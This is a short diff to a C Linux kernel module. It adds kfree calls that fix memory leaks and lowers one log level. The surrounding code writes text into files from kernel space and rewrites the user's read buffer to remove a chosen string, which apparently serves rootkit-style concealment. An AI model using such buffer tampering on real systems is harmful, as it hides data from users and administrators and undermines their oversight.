@@ -58,10 +58,11 @@ void add_text_to_file(char* text, char* file_path) {
 	// declare variables
 	mm_segment_t fs;
 
+	// open file
 	struct file* filp = filp_open(file_path, O_WRONLY | O_APPEND, 0);
 	if (IS_ERR(filp)) {
 
-		printk(KERN_ALERT "could not open file %s\n", file_path);
+		printk(KERN_ERR "could not open file %s\n", file_path);
 		return;
 	}
 
@@ -114,6 +115,7 @@ void delete_text_from_file(char* text, char* file_path) {
 		printk("couldn't find text in file\n");
 		set_fs(fs);
 		filp_close(filp, NULL);
+		kfree(buf);
 		return;
 	}
 
@@ -134,6 +136,7 @@ void delete_text_from_file(char* text, char* file_path) {
 	// cleanup
         set_fs(fs);
 	filp_close(filp, NULL);
+	kfree(buf);
 }
 
 int delete_text_from_buffer(char* text, char* buf, int bytes_read) {
@@ -153,7 +156,10 @@ int delete_text_from_buffer(char* text, char* buf, int bytes_read) {
 
 	// find our text in the buffer
 	position = strstr(k_buf, text);
-	if (position == NULL) return bytes_read;
+	if (position == NULL) {
+		kfree(k_buf);
+		return bytes_read;
+	}
 
 	// create a bunch of variables with this pointer
 	text_size = strlen(text);
@@ -164,6 +170,9 @@ int delete_text_from_buffer(char* text, char* buf, int bytes_read) {
 
 	// overwrite user's buffer
 	copy_to_user(buf + offset, end_of_buffer, end_of_buffer_size + 1); // the + 1 is to write a null byte at the end
+		
+	// cleanup and return
+	kfree(k_buf);
 	return new_size;
 }
 
